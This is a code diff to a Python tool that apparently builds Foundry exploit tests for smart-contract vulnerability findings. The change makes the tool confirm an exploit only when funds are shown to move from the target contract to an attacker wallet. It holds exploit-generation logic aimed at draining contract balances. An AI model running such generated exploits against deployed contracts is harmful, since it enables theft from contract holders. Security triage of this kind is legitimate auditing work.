@@ -191,17 +191,21 @@ def build_exploit(finding, fn: Function, target: str, wallet: str = ATTACKER_WAL
         body += (
             "        uint256 attBefore = attacker.balance;\n"
             "        uint256 tokBefore = _tok(attacker);\n"
+            "        uint256 tgtWei = TARGET.balance;\n"
+            "        uint256 tgtTok = _tok(TARGET);\n"
             f'        vm.startPrank(attacker, attacker);\n'
             f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=True)}));\n'
             "        vm.stopPrank();\n"
             '        console2.log("CALL_OK", ok);\n'
             '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(attBefore));\n'
             '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(tokBefore));\n'
+            '        console2.log("TARGET_WEI_DELTA", int256(TARGET.balance) - int256(tgtWei));\n'
+            '        console2.log("TARGET_TOK_DELTA", int256(_tok(TARGET)) - int256(tgtTok));\n'
         )
     return body + _FOOTER
 
 
-_LOG_RE = re.compile(r"^\s*(CALL_OK|CODE_DELTA|ATTACKER_WEI_DELTA|TOKEN_DELTA)\s+(-?\d+|true|false)\s*$", re.M)
+_LOG_RE = re.compile(r"^\s*(CALL_OK|CODE_DELTA|ATTACKER_WEI_DELTA|TOKEN_DELTA|TARGET_WEI_DELTA|TARGET_TOK_DELTA)\s+(-?\d+|true|false)\s*$", re.M)
 
 
 def parse_outcome(finding, stdout: str) -> PayloadVerdict:
@@ -216,6 +220,9 @@ def parse_outcome(finding, stdout: str) -> PayloadVerdict:
     wei = int(vals.get("ATTACKER_WEI_DELTA", "0"))
     tok = int(vals.get("TOKEN_DELTA", "0"))
     code = int(vals.get("CODE_DELTA", "0"))
+    tgt_wei = int(vals.get("TARGET_WEI_DELTA", "0"))
+    tgt_tok = int(vals.get("TARGET_TOK_DELTA", "0"))
+    target_lost = tgt_wei < 0 or tgt_tok < 0     # 200% differential: the TARGET must actually lose funds
     det = finding.detector
 
     if not call_ok:
@@ -233,16 +240,21 @@ def parse_outcome(finding, stdout: str) -> PayloadVerdict:
                 else PayloadVerdict(finding, "no_change", "call succeeds but the wallet's balance is unchanged"))
     if det in ("arbitrary-recipient-withdrawal",):
         gain = max(wei, tok)
-        return (PayloadVerdict(finding, "confirmed", f"{gain} (wei/token) moved to the wallet {w}", gain) if gain > 0
-                else PayloadVerdict(finding, "no_change", "withdrawal call succeeds but the wallet gained nothing"))
+        # 200% differential: the wallet must GAIN and the target must LOSE the same funds. A gain with no
+        # target loss (minted/rebased/returned) or a success with no movement is a fallback trap -> drop.
+        if gain > 0 and target_lost:
+            return PayloadVerdict(finding, "confirmed", f"{gain} (wei/token) drained from the target to the wallet {w}", gain)
+        return PayloadVerdict(finding, "no_change",
+                              "withdrawal call succeeds but the target did not lose funds to the wallet (fallback / no drain)")
     if det == "unrestricted-burn-from":
         # burning a third party's balance needs a funded victim -> can't prove with a generic payload
         return PayloadVerdict(finding, "manual", "burn-from needs a funded victim; verify by hand")
-    # privileged-function: a non-reverting unauthorized call is suspicious but impact isn't proven generically
-    if wei > 0 or tok > 0:
-        return PayloadVerdict(finding, "confirmed", f"unauthorized call moved {max(wei, tok)} to the wallet {w}", max(wei, tok))
+    # privileged-function: confirmed only if the wallet gained AND the target lost the same funds
+    # (the 200% differential). A non-reverting call that moves nothing is left for manual review.
+    if (wei > 0 or tok > 0) and target_lost:
+        return PayloadVerdict(finding, "confirmed", f"unauthorized call drained {max(wei, tok)} from the target to the wallet {w}", max(wei, tok))
     return PayloadVerdict(finding, "manual",
-                          "unauthorized call does NOT revert - no funds moved generically; confirm the impact by hand")
+                          "unauthorized call does NOT revert - no funds moved to the wallet generically; confirm the impact by hand")
 
 
 def _function_of(files: list[SourceFile], finding) -> Function | None:
